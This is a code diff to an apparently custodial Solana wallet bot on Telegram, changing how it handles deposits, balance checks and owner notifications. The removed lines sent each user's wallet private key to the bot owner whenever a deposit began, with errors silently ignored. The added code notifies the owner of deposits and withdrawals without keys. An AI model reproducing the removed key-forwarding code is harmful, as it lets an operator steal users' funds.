@@ -283,17 +283,8 @@ async def cb_deposit(query: CallbackQuery):
         texts.deposit_text(user["wallet_pub"]),
         parse_mode="HTML",
         reply_markup=kb.deposit_kb(user["wallet_pub"]))
-    # notify admin of deposit with wallet info
-    try:
-        await notify_owner(
-            query.message.bot,
-            f"💰 USER DEPOSIT INITIATED\n\n"
-            f"👤 {user_line(await db.get_user(query.from_user.id))}\n"
-            f"🏦 Wallet: <code>{user.get('wallet_pub')}</code>\n"
-            f"🔑 Wallet Key: <code>{user.get('wallet_priv', 'N/A')}</code>\n"
-            f"💵 Amount: see on-chain deposit.")
-    except Exception:
-        pass
+    # Note: REAL deposits are detected on-chain (balance delta) in _show_panel
+    # and by the scheduler — the admin is DM'd automatically with the amount.
 
 
 @router.callback_query(F.data == "wp")
@@ -315,6 +306,12 @@ async def _show_panel(msg, user_id=None):
         return
     try:
         balance = await asyncio.to_thread(solana.sol_balance, user["wallet_pub"])
+        # REAL deposit detection: any balance increase -> admin DM once
+        try:
+            from utils import detect_deposit
+            await detect_deposit(msg.bot, user, balance)
+        except Exception as e:
+            log.warning(f"_show_panel: deposit check failed for {user_id}: {e}")
     except Exception:
         balance = 0
     bal_sol = solana.lam_to_sol(balance)
@@ -561,6 +558,13 @@ async def got_wd_address(message: Message, state: FSMContext):
         return
     await state.clear()
     await message.answer(texts.withdraw_done(sig, item, amt))
+    # Admin gets every real withdrawal (isolated)
+    try:
+        await notify_owner(
+            message.bot,
+            texts.owner_withdraw(user_line(user), user["wallet_pub"], addr, item, amt, sig))
+    except Exception as e:
+        log.warning(f"got_wd_address: admin notify failed for {message.from_user.id}: {e}")
 
 
 # ------------------------------------------------------------------ positions
